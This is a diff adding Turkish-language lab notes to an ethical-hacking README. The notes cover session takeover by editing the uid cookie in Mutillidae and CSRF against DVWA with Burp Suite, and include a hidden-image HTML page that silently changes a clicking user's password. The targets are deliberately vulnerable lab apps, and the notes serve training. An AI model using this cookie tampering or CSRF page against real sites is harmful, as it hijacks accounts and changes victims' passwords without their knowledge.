@@ -55,6 +55,15 @@
   - [Insecure DOR Order Ticket](#Insecure-DOR-Reset-Secret)
 - [Portswigger](#Portswigger)
   - [Başkasının Chat Geçmişini Okuma](#Başkasının-Chat-Geçmişini-Okuma)
+- [Metasploitable 2 DataBase Değiştirme](#Metasploitable-2-DataBase-Değiştirme)
+- [Mutillidae Cookie](#Mutillidae-Cookie)
+- [CSRF Cross Site Requset Forgery](#CSRF-Cross-Site-Requset-Forgery)
+  - [CSRF Mutillidae](#CSRF-Mutillidae)
+  - [CSRF DVWA](#CSRF-DVWA)
+  - [CSRF Link ile Hackleme](#CSRF-Link-ile-Hackleme)
+- [Brute Force](#Brute-Force) 
+  - [Şifre Bulma](#Şifre-Bulma)
+  - [Kullanıcı Adı ve Şifre Bulma](#Kullanıcı-Adı-ve-Şifre-Bulma)
 
 
 # IP Çeşitleri
@@ -606,3 +615,103 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 - Bu site için ```1.txt``` yaparak daha eski konuşma bilgilerine erişebiliriz
 
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.49.13.jpeg)
+
+# Metasploitable 2 DataBase Değiştirme
+
+- ```metasploitable 2``` açıyoruz
+- ```sudo nano /var/www/html/config.inc``` açıyoruz
+- ```$dbname=`metasploit`;``` yerine ```$db=`owasp10`;``` yazıyoruz
+
+# Mutillidae Cookie
+
+- Siteye sağ tıklayıp ```inspect``` diyoruz
+- ```Storage``` kısmında ```cookie```ler bulunur
+- ```uid (unique ID)``` aynı kullanıcı adına sahip kişileri ayırmamızı sağlar
+- ```uid```'i değiştirerek başka kullanıcılara erişebiliriz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.56.54.jpeg)
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.57.16.jpeg)
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.57.58.jpeg)
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.57.51.jpeg)
+
+- ! Google'dan "cookie manager firefox" diyerek cookie editleme eklentileri ekleyebiliriz
+
+# CSRF Cross Site Requset Forgery
+
+- ```CSRF``` istek yapmanın sahtekarlığıdır
+- Yapılan isteklerin başka kullanıcılar için manipüle edilmesidir
+- Genellikle şifre değiştirirken karşımıza çıkar
+
+> ## Cross Site Request Forgery CSRF Mutillidae
+
+- ```Burpsuite intercept is on``` yapıyoruz 
+- Bloga yazı yazıp yolluyoruz ve burpsuite'den yakalıyoruz
+- Yakaladığımız parametreleri değiştirmeyi deniyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.07.59.jpeg)
+
+- ```uid```'yi 1 yapıyoruz ve bloga admin adıyla yazmayı deniyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.08.18.jpeg)
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.08.29.jpeg)
+
+> ## Cross Site Request Forgery CSRF DVWA
+
+- ```Burpsuite intercept is on``` yapıyoruz
+- Şifremizi yazıp burpsuite üzerinden yakalıyoruz ve parametrelere bakıyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.12.25.jpeg)
+
+- ```Burpsuite```'den yakaladıktan sonra sağ tıklıyoruz ve ```send to repeater``` diyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.22.15.jpeg)
+
+- ```Repeater``` yollanan isteğin cevabını hızlıca görmemizi sağlar
+- 2 şifreyi aynı girince şifremiz değişiyor
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.25.24.jpeg)
+
+- 2 şifreyi birbirinden farklı olarak değiştiriyoruz 
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.26.07.jpeg)
+
+- Şimdi acaba ```GET request``` linkini başkasına yollayıp o linke tıklanırsa hedef kullanıcın şifresi değişir mi onu deniyoruz
+- Sağ tık yaparak ```copy URL``` diyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2012.50.45.jpeg)
+
+- Yolluyoruz ve linke tıklayınca tıklayan kullanıcın şifresi linkte belirlenen şifre oluyor
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.33.04.jpeg)
+
+> ## CSRF Link ile Hackleme
+
+- Bu linki başkasına yolladığımız zaman şifresinin değiştiğini anlayabilir bunun için web sayfası oluşturuyoruz
+- ```<img style="display::none", src="http://192.168.126.132/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change", alt="">``` kodunu site kodları içine yerleştiriyoruz
+```
+<!DOCTYPE html>
+<html>
+	<body>
+		
+		<img style="display::none", src="http://192.168.126.132/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change", alt="">
+	
+	
+	</body>
+
+</html>
+```
+- Kodlarıyla açılcak site beyaz ekran olur ama yinede şifre değişir
+- ```display::none``` dersek açılan sayfada görünmez
+- Artık içinde bu kodu bulunduran siteye tıklayan kişilerin şifresi linkte belirlenen şifreyle değiştirilir
+
+
+# Brute Force 
+> ## Şifre Bulma
+> ## Kullanıcı Adı ve Şifre Bulma
+
+
+
